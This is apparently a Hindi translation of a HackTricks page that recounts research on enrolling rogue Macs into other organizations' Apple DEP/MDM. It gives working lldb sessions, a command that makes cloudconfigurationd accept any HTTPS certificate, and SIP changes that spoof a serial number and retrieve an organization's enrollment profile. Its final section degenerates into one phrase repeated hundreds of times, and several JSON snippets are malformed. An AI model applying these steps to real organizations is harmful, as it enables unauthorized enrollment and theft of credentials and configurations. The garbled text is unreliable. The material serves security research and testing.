# अन्य संगठनों में उपकरणों को नामांकित करना

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल** हों या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें।**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके अपनी जानकारी साझा करें।**

</details>

## परिचय

[**पहले ही टिप्पणी में**](./#what-is-mdm-mobile-device-management)**,** एक उपकरण को संगठन में नामांकित करने के लिए **केवल उस संगठन के एक सीरियल नंबर की आवश्यकता होती है**। एक बार उपकरण नामांकित हो जाता है, कई संगठन नए उपकरण पर संवेदनशील डेटा स्थापित करेंगे: प्रमाणपत्र, एप्लिकेशन, WiFi पासवर्ड, VPN कॉन्फ़िगरेशन [और इत्यादि](https://developer.apple.com/enterprise/documentation/Configuration-Profile-Reference.pdf)।\
इसलिए, यदि नामांकन प्रक्रिया सही ढंग से संरक्षित नहीं है, तो यह हमलावरों के लिए एक खतरनाक प्रवेश बिंदु हो सकता है।

**निम्नलिखित अनुसंधान** [**https://duo.com/labs/research/mdm-me-maybe**](https://duo.com/labs/research/mdm-me-maybe) **से लिया गया है**

## प्रक्रिया का उल्टा अभिप्रेत करना

### DEP और MDM में शामिल बाइनरी

हमारे अनुसंधान के दौरान, हमने निम्नलिखित का अध्ययन किया:

* **`mdmclient`**: एक MDM सर्वर के साथ संवाद करने के लिए ओएस द्वारा उपयोग किया जाता है। macOS 10.13.3 और पहले इसे DEP चेक-इन को ट्रिगर करने के लिए भी उपयोग किया जा सकता है।
* **`profiles`**: macOS पर कॉन्फ़िगरेशन प्रोफ़ाइल स्थापित, हटाएं और देखें करने के लिए एक उपयोगीता है। macOS 10.13.4 और नवीनतम पर यह DEP चेक-इन को ट्रिगर करने के लिए भी उपयोग किया जा सकता है।
* **`cloudconfigurationd`**: डिवाइस नामांकन क्लाइंट डेमन, जो DEP API के साथ संवाद करने और डिवाइस नामांकन प्रोफ़ाइल प्राप्त करने के लिए जिम्मेदार है।

`mdmclient` या `profiles` का उपयोग करके DEP चेक-इन शुरू करने के दौरान, _Activation Record_ प्राप्त करने के लिए `CPFetchActivationRecord` और `CPGetActivationRecord` फ़ंक्शन का उपयोग किया जाता है। `CPFetchActivationRecord` द्वारा नियंत्रण `cloudconfigurationd` को [XPC](https://developer.apple.com/documentation/xpc) के माध्यम से दिया जाता है, जो फिर DEP API से _Activation Record_ प्राप्त करता है।

`CPGetActivationRecord` उपलब्ध होने पर _Activation Record_ को कैश से प्राप्त करता है। ये फ़ंक्शन प्राइवेट Configuration Profiles framework में परिभाषित होते हैं, जो `/System/Library/PrivateFrameworks/Configuration Profiles.framework` पर स्थित है।

### Tesla Protocol और Absinthe Scheme का रिवर्स इंजीनियरिंग

DEP चेक-इन प्रक्रिया के दौरान, `cloudconfigurationd` _iprofiles.apple.com/macProfile_ से _Activation Record_ का अनुरोध करता है। अनुरोध पेलोड एक JSON शब्दकोश होता है जिसमें दो कुंजी-मान जोड़े होते हैं:
```
{
"sn": "",
action": "RequestProfileConfiguration
}
```
पेलोड "अब्सिंथ" के रूप में आंतरिक रूप से संकेतित और एन्क्रिप्ट किया जाता है। एन्क्रिप्टेड पेलोड फिर से Base 64 कोडिंग किया जाता है और इसे _iprofiles.apple.com/macProfile_ में एक HTTP POST में अनुरोध शरीर के रूप में उपयोग किया जाता है।

`cloudconfigurationd` में, _सक्रियण रिकॉर्ड_ को `MCTeslaConfigurationFetcher` कक्षा द्वारा हैंडल किया जाता है। `[MCTeslaConfigurationFetcher enterState:]` से सामान्य फ्लो निम्नानुसार होता है:
```
rsi = @selector(verifyConfigBag);
rsi = @selector(startCertificateFetch);
rsi = @selector(initializeAbsinthe);
rsi = @selector(startSessionKeyFetch);
rsi = @selector(establishAbsintheSession);
rsi = @selector(startConfigurationFetch);
rsi = @selector(sendConfigurationInfoToRemote);
rsi = @selector(sendFailureNoticeToRemote);
```
जैसा कि लगता है, **Absinthe** योजना का उपयोग DEP सेवा को अनुरोधों की प्रमाणित करने के लिए किया जाता है, इस योजना को **रिवर्स इंजीनियरिंग** करने से हमें DEP API के लिए अपने खुद के प्रमाणित अनुरोध बनाने की अनुमति मिलेगी। यह साबित हुआ कि यह काम समय लेने वाला है, हालांकि, अधिकांश समय प्रमाणित अनुरोधों में शामिल चरणों की संख्या के कारण। इस योजना का काम कैसे करता है पूरी तरह से रिवर्स करने की बजाय, हमने विचार किया अन्य तरीकों के बारे में जिससे _Activation Record_ अनुरोध का हिस्सा अनुकरण किया जा सकता है।

### DEP अनुरोधों का MITMing

हमने [Charles Proxy](https://www.charlesproxy.com) के साथ _iprofiles.apple.com_ के नेटवर्क अनुरोधों को प्रॉक्सी करने की क्षमता की जांच की। हमारा लक्ष्य _iprofiles.apple.com/macProfile_ को भेजे गए पेलोड की जांच करना था, फिर एक अनियमित सीरियल नंबर डालना और अनुरोध को फिर से प्ले करना। पहले ही उल्लिखित तरह, `cloudconfigurationd` द्वारा उस अंत-बिंदु को सबमिट किया जाने वाला पेलोड [JSON](https://www.json.org) प्रारूप में होता है और दो की-मान जोड़ी शामिल होती हैं।
```
{
"action": "RequestProfileConfiguration",
sn": "
}
```
चार्ल्स में SSL प्रॉक्सी को सक्षम करने के लिए हमें _iprofiles.apple.com_ पर ट्रांसपोर्ट लेयर सुरक्षा (TLS) का उपयोग करने वाले API की आवश्यकता थी, ताकि हम SSL अनुरोधों की सादा पाठ सामग्री देख सकें।

हालांकि, `-[MCTeslaConfigurationFetcher connection:willSendRequestForAuthenticationChallenge:]` विधि सर्वर प्रमाणपत्र की मान्यता की जांच करती है, और अगर सर्वर विश्वास को सत्यापित नहीं किया जा सकता है तो यह निरस्त कर देगी।
```
[ERROR] Unable to get activation record: Error Domain=MCCloudConfigurationErrorDomain Code=34011
"The Device Enrollment server trust could not be verified. Please contact your system
administrator." UserInfo={USEnglishDescription=The Device Enrollment server trust could not be
verified. Please contact your system administrator., NSLocalizedDescription=The Device Enrollment
server trust could not be verified. Please contact your system administrator.,
MCErrorType=MCFatalError}
```
ऊपर दिखाए गए त्रुटि संदेश को एक बाइनरी _Errors.strings_ फ़ाइल में स्थित है जिसकी कुंजी `CLOUD_CONFIG_SERVER_TRUST_ERROR` है, जो `/System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings` पर स्थित है, इसके साथ ही अन्य संबंधित त्रुटि संदेशों के साथ।
```
$ cd /System/Library/CoreServices
$ rg "The Device Enrollment server trust could not be verified"
ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
<snip>
```
बिल्ट-इन `plutil` कमांड के साथ _Errors.strings_ फ़ाइल को [मानव-पठनीय प्रारूप में प्रिंट](https://duo.com/labs/research/mdm-me-maybe#error\_strings\_output) किया जा सकता है।
```
$ plutil -p /System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
```
फिर से `MCTeslaConfigurationFetcher` कक्षा में जांच करने के बाद, हालांकि, स्पष्ट हुआ कि इस सर्वर विश्वास व्यवहार को `com.apple.ManagedClient.cloudconfigurationd` प्राथमिकता डोमेन पर `MCCloudConfigAcceptAnyHTTPSCertificate` कॉन्फ़िगरेशन विकल्प को सक्षम करके दूर किया जा सकता है।
```
loc_100006406:
rax = [NSUserDefaults standardUserDefaults];
rax = [rax retain];
r14 = [rax boolForKey:@"MCCloudConfigAcceptAnyHTTPSCertificate"];
r15 = r15;
[rax release];
if (r14 != 0x1) goto loc_10000646f;
```
`MCCloudConfigAcceptAnyHTTPSCertificate` विन्यास विकल्प `defaults` कमांड के साथ सेट किया जा सकता है।
```
sudo defaults write com.apple.ManagedClient.cloudconfigurationd MCCloudConfigAcceptAnyHTTPSCertificate -bool yes
```
SSL Proxying सक्षम करने के साथ _iprofiles.apple.com_ के लिए और `cloudconfigurationd` को किसी भी HTTPS प्रमाणपत्र को स्वीकार करने के लिए कॉन्फ़िगर किया गया है, हमने Charles Proxy में मैन-इन-द-मिडल और रिप्ले करने की कोशिश की।

हालांकि, HTTP POST अनुरोध के शरीर में शामिल पेलोड में शामिल डेटा जेएसओएन को Absinthe (NACSign) के साथ हस्ताक्षरित और एन्क्रिप्ट किया जाता है, इसलिए **इसे संशोधित करके एक अनियमित सीरियल नंबर शामिल करना संभव नहीं है जब तक इसे डिक्रिप्ट करने की कुंजी भी हो**। हालांकि, यह कुंजी मेमोरी में रहती है, इसे प्राप्त करना संभव होगा, लेकिन हमने इसके बजाय `cloudconfigurationd` की जांच करने के लिए [LLDB](https://lldb.llvm.org) डीबगर के साथ आगे बढ़ने का फैसला किया।

### DEP के साथ संवाद करने वाले सिस्टम बाइनरी को यंत्रणा देना

_आईप्रोफाइल्स.एप्पल.कॉम/मैकप्रोफाइल_ में अनियमित सीरियल नंबर सबमिट करने की प्रक्रिया को स्वचालित करने के लिए हमने अंतिम तरीका जांचा था, जो सीधे या अप्रत्यक्ष रूप से DEP API के साथ संवाद करने वाले प्राकृतिक बाइनरी को यंत्रणा देने का काम करता है। इसमें `mdmclient`, `profiles`, और `cloudconfigurationd` की [Hopper v4](https://www.hopperapp.com) और [Ida Pro](https://www.hex-rays.com/products/ida/) में प्राथमिक अन्वेषण शामिल था, और `lldb` के साथ कुछ लंबी डीबगिंग सत्रों की आवश्यकता पड़ी।

इस तरीके के एक लाभ यह है कि इसे बाइनरी को संशोधित करके और अपनी खुद की कुंजी के साथ पुनः साइन करके नहीं करना पड़ता है, जो macOS में बने कुछ entitlements प्रतिबंधों को टाल सकता है।

**सिस्टम अखंडता संरक्षण**

macOS पर सिस्टम बाइनरी (जैसे `cloudconfigurationd`) को यंत्रणा देने के लिए [सिस्टम अखंडता संरक्षण](https://support.apple.com/en-us/HT204899) (SIP) को अक्षम करना चाहिए। SIP एक सुरक्षा प्रौद्योगिकी है जो सिस्टम स्तरीय फ़ाइलों, फ़ोल्डरों, और प्रक्रियाओं को तदनुसार करने से बचाती है, और OS X 10.11 "एल कैपिटन" और बाद में डिफ़ॉल्ट रूप से सक्षम होती है। [SIP को अक्षम किया जा सकता है](https://developer.apple.com/library/archive/documentation/Security/Conceptual/System\_Integrity\_Protection\_Guide/ConfiguringSystemIntegrityProtection/ConfiguringSystemIntegrityProtection.html) रिकवरी मोड में बूट करके और टर्मिनल एप्लिकेशन में निम्नलिखित कमांड चलाकर, फिर सिस्टम को पुनः बूट करके:
```
csrutil enable --without debug
```
यह ध्यान देने योग्य है, हालांकि, SIP एक उपयोगी सुरक्षा सुविधा है और इसे निष्क्रिय करना चाहिए केवल अनुसंधान और परीक्षण के उद्देश्यों के लिए गैर-उत्पादन मशीनों पर। इसे मुख्य ऑपरेटिंग सिस्टम के बजाय गैर-महत्वपूर्ण वर्चुअल मशीन पर करना भी संभव है (और सिफारिश की जाती है)।

**LLDB के साथ बाइनरी इंस्ट्रुमेंटेशन**

SIP निष्क्रिय करने के बाद, हम फिर से आगे बढ़ सकते हैं जो DEP API के साथ संवाद करने वाले सिस्टम बाइनरी को इंस्ट्रुमेंट करने के साथ। विशेष रूप से, `cloudconfigurationd` बाइनरी की आवश्यकता होती है। `cloudconfigurationd` को चलाने के लिए उच्चतर अधिकारों की आवश्यकता होती है, इसलिए हमें `lldb` को `sudo` के साथ शुरू करना होगा।
```
$ sudo lldb
(lldb) process attach --waitfor --name cloudconfigurationd
```
जब `lldb` प्रतीक्षा कर रहा हो, तब हम एक अलग टर्मिनल विंडो में `sudo /usr/libexec/mdmclient dep nag` चलाकर `cloudconfigurationd` को जोड़ सकते हैं। जब जुड़ जाएं, तो निम्नलिखित के समान आउटपुट प्रदर्शित होगा और LLDB कमांड प्रोम्प्ट पर टाइप किए जा सकते हैं।
```
Process 861 stopped
* thread #1, stop reason = signal SIGSTOP
<snip>
Target 0: (cloudconfigurationd) stopped.

Executable module set to "/usr/libexec/cloudconfigurationd".
Architecture set to: x86_64h-apple-macosx.
(lldb)
```
**डिवाइस सीरियल नंबर सेट करना**

`mdmclient` और `cloudconfigurationd` को रिवर्स करते समय हमने पहले चीजों में से एक चीज ढूंढ़ी थी, जो उपकरण को प्रमाणित करने के लिए अंततः जिम्मेदार होता है, वह है सिस्टम सीरियल नंबर प्राप्त करने के लिए जिम्मेदार कोड। हमारा लक्ष्य था कि सीरियल नंबर को मेमोरी में प्राप्त होने के बाद संशोधित किया जाए और जब `cloudconfigurationd` `macProfile` पेलोड बनाता है, तो वह उपयोग किया जाए।

हालांकि, `cloudconfigurationd` अंततः DEP API के साथ संचार करने के लिए जिम्मेदार है, हमने यह भी देखा कि क्या सिस्टम सीरियल नंबर `mdmclient` के भीतर प्राप्त किया जाता है या सीधे उपयोग किया जाता है। नीचे दिखाए गए सीरियल नंबर को जो प्राप्त किया जाता है, वह DEP API को भेजा नहीं जाता है, लेकिन यह एक हार्डकोड सीरियल नंबर प्रकट करता है जो उपयोग किया जाता है अगर एक विशेष कॉन्फ़िगरेशन विकल्प सक्षम है।
```
int sub_10002000f() {
if (sub_100042b6f() != 0x0) {
r14 = @"2222XXJREUF";
}
else {
rax = IOServiceMatching("IOPlatformExpertDevice");
rax = IOServiceGetMatchingServices(*(int32_t *)*_kIOMasterPortDefault, rax, &var_2C);
<snip>
}
rax = r14;
return rax;
}
```
सिस्टम सीरियल नंबर [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) से प्राप्त किया जाता है, यदि `sub_10002000f` का रिटर्न वैल्यू जीरो नहीं है, तो इसे स्थिर स्ट्रिंग "2222XXJREUF" पर सेट किया जाता है। उस फ़ंक्शन की जांच करने पर पता चलता है कि क्या "सर्वर स्ट्रेस टेस्ट मोड" सक्षम है।
```
void sub_1000321ca(void * _block) {
if (sub_10002406f() != 0x0) {
*(int8_t *)0x100097b68 = 0x1;
sub_10000b3de(@"Server stress test mode enabled", rsi, rdx, rcx, r8, r9, stack[0]);
}
return;
}
```
हमने "सर्वर स्ट्रेस टेस्ट मोड" की मौजूदगी को दर्ज किया है, लेकिन हमने इसे और अधिक जांचने का प्रयास नहीं किया, क्योंकि हमारा लक्ष्य DEP API को प्रस्तुत किए गए सीरियल नंबर को संशोधित करना था। इसके बजाय, हमने यह जांचा कि `r14` रजिस्टर द्वारा संकेतित सीरियल नंबर को संशोधित करने से क्या पर्याप्त होगा, जिसे हमारे द्वारा टेस्ट किए जा रहे मशीन के लिए नहीं था।

अगले, हमने `cloudconfigurationd` में सिस्टम सीरियल नंबर को प्राप्त करने की प्रक्रिया को देखा।
```
int sub_10000c100(int arg0, int arg1, int arg2, int arg3) {
var_50 = arg3;
r12 = arg2;
r13 = arg1;
r15 = arg0;
rbx = IOServiceGetMatchingService(*(int32_t *)*_kIOMasterPortDefault, IOServiceMatching("IOPlatformExpertDevice"));
r14 = 0xffffffffffff541a;
if (rbx != 0x0) {
rax = sub_10000c210(rbx, @"IOPlatformSerialNumber", 0x0, &var_30, &var_34);
r14 = rax;
<snip>
}
rax = r14;
return rax;
}
```
जैसा कि ऊपर दिखाया गया है, सीरियल नंबर [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) में `cloudconfigurationd` से प्राप्त किया जाता है।

`lldb` का उपयोग करके, हमने `IOServiceGetMatchingService` के लिए ब्रेकपॉइंट सेट करके [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) से प्राप्त किए गए सीरियल नंबर को संशोधित किया है। हमने एक नया स्ट्रिंग वेरिएबल बनाकर एक अनियमित सीरियल नंबर को रखा है और `r14` रजिस्टर को हमने हमारे द्वारा बनाए गए वेरिएबल के मेमोरी पते की ओर पुनः लिखने के लिए संशोधित किया है।
```
(lldb) breakpoint set -n IOServiceGetMatchingService
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --waitfor --name cloudconfigurationd
Process 2208 stopped
* thread #2, queue = 'com.apple.NSXPCListener.service.com.apple.ManagedClient.cloudconfigurationd',
stop reason = instruction step over frame #0: 0x000000010fd824d8
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd + 73
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd:
->  0x10fd824d8 <+73>: movl   %ebx, %edi
0x10fd824da <+75>: callq  0x10ffac91e               ; symbol stub for: IOObjectRelease
0x10fd824df <+80>: testq  %r14, %r14
0x10fd824e2 <+83>: jne    0x10fd824e7               ; <+88>
Target 0: (cloudconfigurationd) stopped.
(lldb) continue  # Will hit breakpoint at `IOServiceGetMatchingService`
# Step through the program execution by pressing 'n' a bunch of times and
# then 'po $r14' until we see the serial number.
(lldb) n
(lldb) po $r14
C02JJPPPQQQRR  # The system serial number retrieved from the `IORegistry`
# Create a new variable containing an arbitrary serial number and print the memory address.
(lldb) p/x @"C02XXYYZZNNMM"
(__NSCFString *) $79 = 0x00007fb6d7d05850 @"C02XXYYZZNNMM"
# Rewrite the `r14` register to point to our new variable.
(lldb) register write $r14 0x00007fb6d7d05850
(lldb) po $r14
# Confirm that `r14` contains the new serial number.
C02XXYYZZNNMM
```
हालांकि हमने [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) से प्राप्त किए गए सीरियल नंबर को संशोधित करने में सफल रहे, लेकिन `macProfile` पेलोड में अब भी सिस्टम सीरियल नंबर ही शामिल था, और नहीं वह जो हमने `r14` रजिस्टर में लिखा था।

**उत्पादन: JSON सीरीयलीकरण से पहले प्रोफ़ाइल अनुरोध शब्दकोश को संशोधित करना**

अगले, हमने `macProfile` पेलोड में भेजे जाने वाले सीरियल नंबर को एक अलग तरीके से सेट करने का प्रयास किया। इस बार, [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) के माध्यम से प्राप्त की गई सिस्टम सीरियल नंबर को संशोधित करने की बजाय, हमने Absinthe (`NACSign`) के साथ हस्ताक्षरित करने से पहले सीरियल नंबर को सादा पाठ में रखने वाले कोड में सबसे नजदीकी बिंदु ढूंढ़ने का प्रयास किया। देखने के लिए सबसे अच्छा बिंदु `-[MCTeslaConfigurationFetcher startConfigurationFetch]` पर था, जो लगभग निम्नलिखित कदमों को करता है:

* एक नया `NSMutableData` ऑब्जेक्ट बनाता है
* `[MCTeslaConfigurationFetcher setConfigurationData:]` को कॉल करता है, जिसमें नया `NSMutableData` ऑब्जेक्ट पास करता है
* `[MCTeslaConfigurationFetcher profileRequestDictionary]` को कॉल करता है, जो दो कुंजी-मान जोड़ी वाला एक `NSDictionary` ऑब्जेक्ट लौटाता है:
* `sn`: सिस्टम सीरियल नंबर
* `action`: दूरस्थ कार्रवाई का कार्य (जिसमें `sn` को उसका तर्क मानकर) 
* `[NSJSONSerialization dataWithJSONObject:]` को कॉल करता है, जिसमें `profileRequestDictionary` से `NSDictionary` पास करता है
* Absinthe (`NACSign`) का उपयोग करके JSON पेलोड को हस्ताक्षरित करता है
* हस्ताक्षरित JSON पेलोड को Base64 एनकोड करता है
* HTTP मेथड को `POST` सेट करता है
* HTTP बॉडी को Base64 एनकोड किए गए, हस्ताक्षरित JSON पेलोड सेट करता है
* `X-Profile-Protocol-Version` HTTP हेडर को `1` सेट करता है
* `User-Agent` HTTP हेडर को `ConfigClient-1.0` सेट करता है
* HTTP अनुरोध को करने के लिए `[NSURLConnection alloc] initWithRequest:delegate:startImmediately:]` मेथड का उपयोग करता है

फिर हमने JSON में रूपांतरित होने से पहले `profileRequestDictionary` से लौटाए गए `NSDictionary` ऑब्जेक्ट को संशोधित किया। इसके लिए, हमने `dataWithJSONObject` पर ब्रेकपॉइंट सेट किया था ताकि हम अभी तक अपरिवर्तित डेटा के करीब से कर सकें। ब्रेकपॉइंट सफल रहा, और जब हमने रजिस्टर की सामग्री को डिसअसेंबली के माध्यम से जाना (`rdx`) तो हमें यह पता चला कि हमें उम्मीद की गई परिणाम दिखाई दिए।
```
po $rdx
{
action = RequestProfileConfiguration;
sn = C02XXYYZZNNMM;
}
```
उपरोक्त एक `NSDictionary` ऑब्जेक्ट का प्रतिनिधित्व करने वाला प्रिंट किया गया है, जो `[MCTeslaConfigurationFetcher profileRequestDictionary]` द्वारा वापस किया जाता है। हमारा अगला चुनौती था सीरियल नंबर को संग्रहीत `NSDictionary` में संशोधित करना।
```
(lldb) breakpoint set -r "dataWithJSONObject"
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --name "cloudconfigurationd" --waitfor
Process 3291 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x00007fff2e8bfd8f Foundation`+[NSJSONSerialization dataWithJSONObject:options:error:]
Target 0: (cloudconfigurationd) stopped.
# Hit next breakpoint at `dataWithJSONObject`, since the first one isn't where we need to change the serial number.
(lldb) continue
# Create a new variable containing an arbitrary `NSDictionary` and print the memory address.
(lldb) p/x (NSDictionary *)[[NSDictionary alloc] initWithObjectsAndKeys:@"C02XXYYZZNNMM", @"sn",
@"RequestProfileConfiguration", @"action", nil]
(__NSDictionaryI *) $3 = 0x00007ff068c2e5a0 2 key/value pairs
# Confirm that `rdx` contains the new `NSDictionary`.
po $rdx
{
action = RequestProfileConfiguration;
sn = <new_serial_number>
}
```
ऊपर दी गई सूची निम्नलिखित कार्रवाई करती है:

* `dataWithJSONObject` सेलेक्टर के लिए एक नियमित अभिरेका ब्रेकपॉइंट बनाता है
* `cloudconfigurationd` प्रक्रिया की शुरुआत का इंतजार करता है, फिर इसे उससे जोड़ता है
* कार्यक्रम के निष्पादन को `continue` करता है, (क्योंकि हम `dataWithJSONObject` के लिए पहला ब्रेकपॉइंट जो हमें `profileRequestDictionary` पर कॉल नहीं किया जाता है, उसे हमने पहले ही पकड़ लिया है)
* हमारे विचित्र `NSDictionary` को बनाने का परिणाम (हेक्स फॉर्मेट में प्रिंट किया जाता है क्योंकि `/x` के कारण)
* क्योंकि हम पहले से ही आवश्यक कुंजीयों के नाम जानते हैं, इसलिए हम सीरियल नंबर को अपनी पसंद के लिए `sn` में सेट कर सकते हैं और कार्रवाई को छोड़ सकते हैं
* इस नए `NSDictionary` को बनाने के परिणाम का प्रिंटआउट हमें बताता है कि हमारे पास एक विशिष्ट मेमोरी स्थान पर दो कुंजी-मान जोड़े हैं

अंतिम कदम अब था कि हमें अपने चयनित सीरियल नंबर को समर्पित करने वाले हमारे अनुकूल `NSDictionary` ऑब्जेक्ट के मेमोरी स्थान को `rdx` में लिखने का यही स्टेप दोहराना था:
```
(lldb) register write $rdx 0x00007ff068c2e5a0  # Rewrite the `rdx` register to point to our new variable
(lldb) continue
```
यह हमारे नए `NSDictionary` को सीरीयलाइज़ करने से पहले `rdx` रजिस्टर को निर्दिष्ट करता है, और इसे [JSON](https://www.json.org) में संकलित करके _iprofiles.apple.com/macProfile_ पर `POST` करता है, फिर कार्यक्रम फ्लो को `continue` करता है।

इस तरीके से प्रोफ़ाइल अनुरोध शब्दकोश में सीरीयल नंबर को संशोधित करने से पहले (null) की बजाय एक ज्ञात-अच्छा DEP-रजिस्टर्ड Apple सीरीयल नंबर का उपयोग करने पर, `ManagedClient` के लिए डीबग लॉग ने उपकरण के लिए पूरा DEP प्रोफ़ाइल दिखाया।
```
Apr  4 16:21:35[660:1]:+CPFetchActivationRecord fetched configuration:
{
AllowPairing = 1;
AnchorCertificates =     (
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://some.url/cloudenroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "Org address";
OrganizationAddressLine1 = "More address";
OrganizationAddressLine2 = NULL;
OrganizationCity = A City;
OrganizationCountry = US;
OrganizationDepartment = "Org Dept";
OrganizationEmail = "dep.management@org.url";
OrganizationMagic = <unique string>;
OrganizationName = "ORG NAME";
OrganizationPhone = "+1551234567";
OrganizationSupportPhone = "+15551235678";
OrganizationZipCode = "ZIPPY";
SkipSetup =     (
AppleID,
Passcode,
Zoom,
Biometric,
Payment,
TOS,
TapToSetup,
Diagnostics,
HomeButtonSensitivity,
Android,
Siri,
DisplayTone,
ScreenSaver
);
SupervisorHostCertificates =     (
);
}
```
कुछ ही `lldb` कमांड के साथ हम एक विचित्र सीरियल नंबर डाल सकते हैं और एक DEP प्रोफ़ाइल प्राप्त कर सकते हैं जिसमें विभिन्न संगठन-विशिष्ट डेटा शामिल होता है, जिसमें संगठन का MDM नामांकन URL शामिल होता है। जैसा कि चर्चा की गई है, इस नामांकन URL का उपयोग करके हम अब एक रोग उपकरण को नामांकित कर सकते हैं क्योंकि हमें इसका सीरियल नंबर पता है। अन्य डेटा का उपयोग एक रोग नामांकन को सामाजिक इंजीनियरिंग करने के लिए किया जा सकता है। एक बार नामांकित होने के बाद, उपकरण को कोई भी प्रमाणपत्र, प्रोफ़ाइल, एप्लिकेशन, VPN कॉन्फ़िगरेशन आदि प्राप्त हो सकती हैं।

### Python के साथ `cloudconfigurationd` उपकरण को स्वचालित करना

जब हमें प्राथमिक प्रमाण-सिद्धि हासिल करने के लिए यह साबित करने का तरीका था कि कैसे केवल एक सीरियल नंबर का उपयोग करके एक वैध DEP प्रोफ़ाइल प्राप्त किया जा सकता है, हम इस प्रक्रिया को स्वचालित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए 